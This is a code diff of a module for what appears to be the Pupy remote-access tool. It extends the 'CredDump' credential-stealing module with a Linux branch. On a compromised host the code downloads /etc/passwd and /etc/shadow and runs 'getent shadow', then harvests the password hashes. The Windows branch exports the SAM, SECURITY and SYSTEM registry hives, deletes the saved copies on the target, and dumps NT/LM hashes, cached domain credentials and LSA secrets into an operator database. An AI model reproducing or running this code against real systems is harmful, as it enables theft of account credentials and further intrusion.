@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 
 # Author: DeveloppSoft - developpsoft.github.io
 
@@ -34,22 +34,98 @@ from modules.lib.windows.creddump.win32.lsasecrets import get_file_secrets
 
 __class_name__="CredDump"
 
-@config(cat="creds", compatibilities=["windows"], tags=['creds',
+@config(cat="creds", compatibilities=['windows', 'linux'], tags=['creds',
     'credentials', 'password', 'gather', 'hives'])
 class CredDump(PupyModule):
-    
+
     """ download the hives from a remote windows system and dump creds """
-    
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
-    
+
     def run(self, args):
-        # First, we download the hives...
-        rep=os.path.join("data","downloads",self.client.short_name(),"hives")
+        self.rep = os.path.join("data", "downloads", self.client.short_name(), "creds")
         try:
-            os.makedirs(rep)
+            os.makedirs(self.rep)
         except Exception:
             pass
+
+        if self.client.is_windows():
+            self.windows()
+        else:
+            self.linux()
+
+    def linux(self):
+        known = set()
+        hashes = []
+
+        def add_hashes(line):
+            user, hsh, rest = line.split(':', 2)
+            if not hsh in ('!','*','x') and not (user, hsh) in known:
+                known.add((user, hsh))
+                hashes.append(line)
+
+        try:
+            passwd = os.path.join(self.rep, 'passwd')
+            download(
+                self.client.conn,
+                '/etc/passwd',
+                passwd
+            )
+
+            with open(passwd, 'r') as fpasswd:
+                for line in fpasswd.readlines():
+                    add_hashes(line)
+
+        except Exception as e:
+            self.error('/etc/passwd is not accessible: {}'.format(e))
+
+        try:
+            shadow = os.path.join(self.rep, 'shadow')
+            download(
+                self.client.conn,
+                '/etc/shadow',
+                shadow
+            )
+
+            with open(shadow, 'r') as fshadow:
+                for line in fshadow.readlines():
+                    add_hashes(line)
+
+        except Exception as e:
+            self.error('/etc/shadow is not accessible: {}'.format(e))
+
+        self.client.load_package('pupyutils.safepopen')
+        sopen = self.client.conn.modules['pupyutils.safepopen'].SafePopen
+
+        try:
+            with open(os.path.join(self.rep, 'getent.passwd'), 'w') as passwd:
+                for line in sopen(['getent', 'passwd']).execute():
+                    if line:
+                        add_hashes(line)
+
+        except Exception as e:
+            self.error('getent passwd failed: {}: {}'.format(type(e), e.message))
+
+        try:
+            with open(os.path.join(self.rep, 'getent.shadow'), 'w') as shadow:
+                for line in sopen(['getent', 'shadow']).execute():
+                    if line:
+                        add_hashes(line)
+
+        except Exception as e:
+            self.error('getent shadow failed: {}: {}'.format(type(e), e.message))
+
+        db = Credentials()
+        db.add([
+            {'hashes':hsh, 'Tool': 'Creddump'} for hsh in hashes
+        ])
+
+        for hsh in hashes:
+            self.log('{}'.format(hsh))
+
+    def windows(self):
+        # First, we download the hives...
 
         #detect windows version
         is_vista=False
@@ -72,18 +148,18 @@ class CredDump(PupyModule):
             self.log(shell_exec(self.client, cmd))
         self.success("hives saved!")
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
-        
+
         self.info("downloading SYSTEM hive...")
-        download(self.client.conn, ntpath.join(remote_temp, "SYSTEM"), os.path.join(rep, "SYSTEM"))
-        
+        download(self.client.conn, ntpath.join(remote_temp, "SYSTEM"), os.path.join(self.rep, "SYSTEM"))
+
         self.info("downloading SECURITY hive...")
-        download(self.client.conn, ntpath.join(remote_temp, "SECURITY"), os.path.join(rep, "SECURITY"))
-        
+        download(self.client.conn, ntpath.join(remote_temp, "SECURITY"), os.path.join(self.rep, "SECURITY"))
+
         self.info("downloading SAM hive...")
-        download(self.client.conn, ntpath.join(remote_temp, "SAM"), os.path.join(rep, "SAM"))
-        
-        self.success("hives downloaded to %s" % rep)
-        
+        download(self.client.conn, ntpath.join(remote_temp, "SAM"), os.path.join(self.rep, "SAM"))
+
+        self.success("hives downloaded to %s" % self.rep)
+
         # Cleanup
         self.success("cleaning up saves...")
         try:
@@ -93,20 +169,20 @@ class CredDump(PupyModule):
             self.success("saves deleted")
         except Exception as e:
             self.warning("error deleting temporary files: %s"%str(e))
-        
+
         # Time to run creddump!
         # HiveFileAddressSpace - Volatilty
-        sysaddr = HiveFileAddressSpace(os.path.join(rep, "SYSTEM"))
-        secaddr = HiveFileAddressSpace(os.path.join(rep, "SECURITY"))
-        samaddr = HiveFileAddressSpace(os.path.join(rep, "SAM"))
-    
+        sysaddr = HiveFileAddressSpace(os.path.join(self.rep, "SYSTEM"))
+        secaddr = HiveFileAddressSpace(os.path.join(self.rep, "SECURITY"))
+        samaddr = HiveFileAddressSpace(os.path.join(self.rep, "SAM"))
+
         # Print the results
         self.success("dumping cached domain passwords...")
 
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
             self.success("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                 d.lower(), dn.lower()))
-        
+
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
         hbootkey = get_hbootkey(samaddr,bootkey)
@@ -117,23 +193,23 @@ class CredDump(PupyModule):
             if not nthash: nthash = empty_nt
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
             hashes.append({'hashes': "%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')), 'Tool': 'Creddump'})
-        
+
         db = Credentials()
         db.add(hashes)
         self.success("Hashes stored on the database")
-        
+
         self.success("dumping lsa secrets...")
-        secrets = get_file_secrets(os.path.join(rep, "SYSTEM"), os.path.join(rep, "SECURITY"), is_vista)
+        secrets = get_file_secrets(os.path.join(self.rep, "SYSTEM"), os.path.join(self.rep, "SECURITY"), is_vista)
         if not secrets:
             self.error("unable to read LSA secrets, perhaps the hives are corrupted")
             return
         for key in secrets:
             self.log(key)
             self.log(self.dump(secrets[key], length=16))
-        
+
         # The End! (hurrah)
         self.success("dump was successfull!")
-        
+
     def dump(self, src, length=8):
         FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
         N=0; result=''
